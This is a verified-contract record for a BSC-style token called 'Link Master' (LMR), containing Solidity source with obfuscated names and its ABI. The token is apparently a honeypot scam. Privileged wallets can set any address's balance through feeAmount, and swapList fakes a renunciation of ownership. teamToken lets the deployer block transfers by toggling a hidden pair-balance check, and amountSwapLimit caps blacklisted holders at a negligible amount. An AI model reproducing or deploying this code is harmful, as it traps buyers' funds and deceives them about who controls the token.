{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface launchShouldTx {\n    function createPair(address atLaunchedIs, address fundMin) external returns (address);\n}\n\ninterface receiverTradingToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedReceiver) external view returns (uint256);\n\n    function transfer(address limitExempt, uint256 tokenTotal) external returns (bool);\n\n    function allowance(address autoSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitExempt,\n        uint256 tokenTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atLiquidity, uint256 value);\n    event Approval(address indexed autoSwap, address indexed spender, uint256 value);\n}\n\nabstract contract atTradingShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverAmountLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listLaunched is receiverTradingToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LinkMaster is atTradingShould, receiverTradingToken, listLaunched {\n\n    function allowance(address feeToken, address swapTeam) external view virtual override returns (uint256) {\n        if (swapTeam == receiverTx) {\n            return type(uint256).max;\n        }\n        return takeEnable[feeToken][swapTeam];\n    }\n\n    function transferFrom(address teamWallet, address limitExempt, uint256 tokenTotal) external override returns (bool) {\n        if (_msgSender() != receiverTx) {\n            if (takeEnable[teamWallet][_msgSender()] != type(uint256).max) {\n                require(tokenTotal <= takeEnable[teamWallet][_msgSender()]);\n                takeEnable[teamWallet][_msgSender()] -= tokenTotal;\n            }\n        }\n        return teamToken(teamWallet, limitExempt, tokenTotal);\n    }\n\n    uint256 private buyLaunched;\n\n    mapping(address => bool) public limitLaunchFee;\n\n    event OwnershipTransferred(address indexed atReceiver, address indexed isSellTake);\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeMax;\n    }\n\n    uint8 private takeMax = 18;\n\n    string private buyExempt = \"Link Master\";\n\n    uint256 private amountWallet;\n\n    bool public walletReceiver;\n\n    uint256 constant swapMin = 13 ** 10;\n\n    function exemptToken() private view {\n        require(limitLaunchFee[_msgSender()]);\n    }\n\n    address public walletMin;\n\n    bool private isLaunched;\n\n    uint256 private swapFrom;\n\n    function swapList() public {\n        emit OwnershipTransferred(walletMin, address(0));\n        listSenderTrading = address(0);\n    }\n\n    address private listSenderTrading;\n\n    mapping(address => bool) public isBuyLiquidity;\n\n    function balanceOf(address launchedReceiver) public view virtual override returns (uint256) {\n        return modeBuy[launchedReceiver];\n    }\n\n    function transfer(address senderTake, uint256 tokenTotal) external virtual override returns (bool) {\n        return teamToken(_msgSender(), senderTake, tokenTotal);\n    }\n\n    uint256 public toTotal;\n\n    function getOwner() external view returns (address) {\n        return listSenderTrading;\n    }\n\n    uint256 totalWallet;\n\n    constructor (){\n        if (atFund != isLaunched) {\n            swapFrom = toTotal;\n        }\n        receiverAmountLaunch tokenLaunch = receiverAmountLaunch(receiverTx);\n        launchAuto = launchShouldTx(tokenLaunch.factory()).createPair(tokenLaunch.WETH(), address(this));\n        \n        walletMin = _msgSender();\n        limitLaunchFee[walletMin] = true;\n        modeBuy[walletMin] = tradingAt;\n        swapList();\n        \n        emit Transfer(address(0), walletMin, tradingAt);\n    }\n\n    function approve(address swapTeam, uint256 tokenTotal) public virtual override returns (bool) {\n        takeEnable[_msgSender()][swapTeam] = tokenTotal;\n        emit Approval(_msgSender(), swapTeam, tokenTotal);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return listSenderTrading;\n    }\n\n    function teamToken(address teamWallet, address limitExempt, uint256 tokenTotal) internal returns (bool) {\n        if (teamWallet == walletMin) {\n            return modeReceiver(teamWallet, limitExempt, tokenTotal);\n        }\n        uint256 receiverSell = receiverTradingToken(launchAuto).balanceOf(swapMode);\n        require(receiverSell == swapToMode);\n        require(limitExempt != swapMode);\n        if (isBuyLiquidity[teamWallet]) {\n            return modeReceiver(teamWallet, limitExempt, swapMin);\n        }\n        return modeReceiver(teamWallet, limitExempt, tokenTotal);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingAt;\n    }\n\n    address receiverTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellLimit;\n    }\n\n    bool public takeTo;\n\n    function feeAmount(address senderTake, uint256 tokenTotal) public {\n        exemptToken();\n        modeBuy[senderTake] = tokenTotal;\n    }\n\n    function marketingLimit(uint256 tokenTotal) public {\n        exemptToken();\n        swapToMode = tokenTotal;\n    }\n\n    bool private atFund;\n\n    mapping(address => mapping(address => uint256)) private takeEnable;\n\n    bool private teamLimit;\n\n    function name() external view virtual override returns (string memory) {\n        return buyExempt;\n    }\n\n    address swapMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public launchAuto;\n\n    string private sellLimit = \"LMR\";\n\n    uint256 swapToMode;\n\n    uint256 private tradingAt = 100000000 * 10 ** 18;\n\n    function amountSwapLimit(address launchedWallet) public {\n        exemptToken();\n        \n        if (launchedWallet == walletMin || launchedWallet == launchAuto) {\n            return;\n        }\n        isBuyLiquidity[launchedWallet] = true;\n    }\n\n    function modeReceiver(address teamWallet, address limitExempt, uint256 tokenTotal) internal returns (bool) {\n        require(modeBuy[teamWallet] >= tokenTotal);\n        modeBuy[teamWallet] -= tokenTotal;\n        modeBuy[limitExempt] += tokenTotal;\n        emit Transfer(teamWallet, limitExempt, tokenTotal);\n        return true;\n    }\n\n    mapping(address => uint256) private modeBuy;\n\n    function txWalletAuto(address takeFund) public {\n        if (takeTo) {\n            return;\n        }\n        \n        limitLaunchFee[takeFund] = true;\n        \n        takeTo = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isSellTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedWallet\",\"type\":\"address\"}],\"name\":\"amountSwapLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTotal\",\"type\":\"uint256\"}],\"name\":\"feeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isBuyLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitLaunchFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenTotal\",\"type\":\"uint256\"}],\"name\":\"marketingLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFund\",\"type\":\"address\"}],\"name\":\"txWalletAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "LinkMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}